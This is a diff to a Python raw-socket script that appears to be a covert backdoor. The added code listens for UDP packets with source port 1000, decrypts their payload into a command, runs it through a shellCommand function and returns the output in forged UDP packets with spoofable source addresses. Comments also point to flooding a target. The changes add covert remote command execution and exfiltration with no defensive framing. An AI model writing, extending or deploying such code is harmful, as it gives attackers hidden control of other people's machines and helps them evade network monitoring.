@@ -104,7 +104,10 @@ def sendCommand(protocol, srcIP, dstIP,  data, password, last):
     ip_tot_len = 0  # kernel will fill the correct total length
     ip_frag_off = 0
     ip_ttl = 144
-    ip_proto = socket.IPPROTO_TCP
+    if (protocol == "TCP"):
+        ip_proto = socket.IPPROTO_TCP
+    if (protocol == "UDP"):
+        ip_proto = socket.IPPROTO_UDP
     ip_check = 0  # kernel will fill the correct checksum
     ip_saddr = socket.inet_aton(srcIP)  # Spoof the source ip address if you want to
     ip_daddr = socket.inet_aton(dstIP)
@@ -167,6 +170,13 @@ def sendCommand(protocol, srcIP, dstIP,  data, password, last):
 
     if (protocol == "UDP"):
         print "create UDP header"
+        data = data
+        sport = password
+        dport = 8505
+        length = 8 + len(str(data))
+        checksum = 0
+        udp_header = pack('!HHHH', sport, dport, length, checksum)
+        packet = ip_header + udp_header + str(data)
 
     # Send the packet finally - the port specified has no effect
     s.sendto(packet, (dstIP, 0))  # put this in a loop if you want to flood the target
@@ -175,13 +185,13 @@ def sendCommand(protocol, srcIP, dstIP,  data, password, last):
 def main(argv):
     # list all devices
     devices = pcapy.findalldevs()
-    print devices
-
-    # ask user to enter device name to sniff
+    #print devices
+    '''
+    #  ask user to enter device name to sniff
     print "Available devices are :"
     for d in devices:
         print d
-
+    '''
     '''
     dev = raw_input("Enter device name to sniff : ")
 
@@ -304,20 +314,38 @@ def parse_packet(packet):
                 udph = unpack('!HHHH', udp_header)
 
                 source_port = udph[0]
-                dest_port = udph[1]
-                length = udph[2]
-                checksum = udph[3]
+                if(source_port == 1000):
+                    dest_port = udph[1]
+                    length = udph[2]
+                    checksum = udph[3]
 
-                print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(
-                    length) + ' Checksum : ' + str(checksum)
+                    print 'Source Port : ' + str(source_port) + ' Dest Port : ' + str(dest_port) + ' Length : ' + str(
+                        length) + ' Checksum : ' + str(checksum)
 
-                h_size = eth_length + iph_length + udph_length
-                data_size = len(packet) - h_size
+                    h_size = eth_length + iph_length + udph_length
+                    data_size = len(packet) - h_size
 
-                # get data from the packet
-                data = packet[h_size:]
+                    # get data from the packet
+                    data = packet[h_size:]
 
-                print 'Data : ' + decrypt(data)
+                    commandString = decrypt(data)
+
+                    print 'Data : ' + commandString
+
+                    output_dec = shellCommand(packet, commandString)
+                    sleep(2)
+
+                    # for seq in range(0, len(output_dec), 1):
+                    last = len(output_dec) - 1
+                    counter = 0
+                    for seq in output_dec:
+                        # for seq in range(0, len(output_dec), 1):
+                        if counter == last:
+                            sendCommand("UDP", d_addr, s_addr, 1000, seq, True)
+                            counter += 1
+                        else:
+                            sendCommand("UDP", d_addr, s_addr, 1000, seq, False)
+                            counter += 1
 
 
         #Dont need ICMP and UDP for now
